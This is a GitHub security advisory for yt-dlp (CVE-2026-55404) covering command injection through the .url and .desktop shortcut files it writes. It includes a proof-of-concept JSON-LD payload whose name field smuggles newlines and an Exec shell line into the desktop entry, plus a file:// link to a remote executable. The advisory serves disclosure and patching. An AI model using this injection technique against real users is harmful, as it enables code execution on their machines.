# [H] yt-dlp: Downstream command injection via improper sanitization of yt-dlp --write-link output

## Summary
Severity: High
Advisory: GHSA-6v4j-43gg-vj32
CVE: CVE-2026-55404
CWE: CWE-74
Ecosystem: PyPI
CVSS: CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:H/I:H/A:H (CVSS_V3)
Published: 2026-07-24
Source: https://github.com/advisories/GHSA-6v4j-43gg-vj32
Type: github-advisory

## Affected
- PyPI: `yt-dlp` — affected >=0 <2026.7.4

## Details
### Summary
If the `--write-link`, `--write-url-link` or `--write-desktop-link` options are used with yt-dlp, it may produce output that can lead to downstream remote code execution. An attacker can craft a malicious metadata payload to achieve arbitrary command injection in the `.url` and `.desktop` shortcut files written by yt-dlp. This allows for malicious shell commands or malicious remote executables to run on the user's system if the user executes the generated `.url` or `.desktop` files.

### Details
The expected result of yt-dlp's `--write-link`, `--write-url-link` and `--write-desktop-link` options is to write a shortcut file that points to the webpage URL for the content downloaded by yt-dlp. The `--write-url-link` option writes a `.url` shortcut file for Windows, the `--write-desktop-link` option writes a `.desktop` shortcut file for Linux, and the `--write-link` option may write a `.url` file or a `.desktop` file depending on the user's platform.

There are two known scenarios where a remote attacker could serve a malicious metadata payload to exploit yt-dlp's improper validation/sanitization of its shortcut output and achieve arbitrary code execution if the user later opens these files.

#### Scenario 1: `file://` URI injection in Windows `.url` shortcut

If a yt-dlp user passes the `--write-link` or `--write-url-link` option to generate a Windows `.url` file, the URL written to the shortcut file is sourced from the downloaded media's metadata--specifically, its `webpage_url` value. This value is commonly a normalized version of the input URL passed to yt-dlp by the user, but in some cases it may be extracted from untrusted web input. Validation of this `webpage_url` value is performed if it is fed back to yt-dlp as an input URL (e.g. via the `--load-info-json` option), but no validation is performed before it is output to a `.url` shortcut file.

This lack of validation is exploitable by a remote attacker who crafts a malicious metadata payload such that the resulting `webpage_url` value is a `file://` URI. A malicious file URI could point to a remote executable, e.g. `file://example.org/pwned.exe`. If a Windows user double-clicks a `.url` file that points to this `webpage_url`, Windows will execute the malicious remote executable on the user's system.

#### Scenario 2: Shell command injection in Linux `.desktop` shortcut

The Linux `.desktop` file format is a more versatile than the Windows `.url` file format. It is defined by the freedesktop.org "desktop entry" file specification, and supports multiple types of shortcuts: a `Link` type for URLs, a `Directory` type for filesystem folders, and an `Application` type for programs or shell commands. yt-dlp outputs a desktop entry file of the `Link` type, using the template below:

```desktop
[Desktop Entry]
Encoding=UTF-8
Name=%(filename)s
Type=Link
URL=%(url)s
Icon=text-html
```

The keys under the `[Desktop Entry]` group are separated by newlines, and the type of desktop entry is set by the value paired to the `Type` key.

If a yt-dlp user passes the `--write-link` or `--write-desktop-link` option to generate a desktop entry file, in addition to the `webpage_url` value there is a `filename` value that is written to the shortcut file. By default, yt-dlp will sanitize the `filename` value: this sanitization includes replacing newlines with spaces and removing other control characters. However, the `--no-windows-filenames` option was modified in yt-dlp version 2024.12.23 to disable this default filename sanitization when used. 

If the user passes `--write-link` or `--write-desktop-link` together with `--no-windows-filenames` to yt-dlp, an unsanitized `filename` value can be written to the resulting desktop entry file. A remote attacker can exploit this lack of sanitization by crafting a malicious metadata payload such that the resulting `filename` value contains newline characters, which can be used to inject arbitrary groups, keys and values into the desktop entry output. Doing so allows the attacker to change the `Type` of the desktop entry to `Application` and achieve shell command injection.

For example, an attacker-controlled website could serve a webpage with this maliciously crafted JSON-LD data:

```html
<html>
<script type="application/ld+json">{
    "@context": "https://schema.org",
    "@type": "VideoObject",
    "name":"Stream\nType=Application\nExec=sh -c &quot;touch /tmp/pwned&quot;\n\n[newgroup]\nName=endtitle",
    "contentUrl": "https://example.org/video.mp4"
}</script>
</html>
```

Then, a yt-dlp user could try to download the legitimate video content from the page by running the following command:

```bash
yt-dlp --write-desktop-link --no-windows-filenames "https://example.org/123"
```

Which would result in a desktop entry file containing a malicious shell command:

```desktop
[Desktop Entry]
Encoding=UTF-8
Name=Stream
Type=Application
Exec=sh -c "touch /tmp/pwned"

[newgroup]
Name=endtitle [123]
Type=Link
URL=%(url)s
Icon=text-html
```

If a user on a Linux desktop environment executes the generated `.desktop` file, the malicious shell command would run on the user's system. (In the above example, a `/tmp/pwned` file would be created in the user's filesystem.)

### Patches
yt-dlp version 2026.07.04 fixes this issue by validating the URL scheme before any shortcut file is written, and by properly sanitizing all desktop entry values written to the `.desktop` file generated from using the `--write-desktop-link` or `--write-link` options. (Most notably: newline characters are replaced by their proper escape sequence per the freedesktop.org desktop entry specification.)

### Workarounds
It is recommended to upgrade yt-dlp to version 2026.07.04 as soon as possible.

Users who are not able to upgrade should avoid using any of the `--write-link`, `--write-url-link` or `--write-desktop-link` options.

## References
- https://github.com/yt-dlp/yt-dlp/security/advisories/GHSA-6v4j-43gg-vj32
- https://nvd.nist.gov/vuln/detail/CVE-2026-55404
- https://github.com/yt-dlp/yt-dlp/commit/6fc85f617a5850307fd5b258477070e6ee177796
- https://github.com/yt-dlp/yt-dlp/commit/b6590aaa1e3808155d69c9a79a797ae484163789
- https://github.com/yt-dlp/yt-dlp
- https://github.com/yt-dlp/yt-dlp-nightly-builds/releases/tag/2026.07.04.221833
- https://github.com/yt-dlp/yt-dlp/releases/tag/2026.07.04
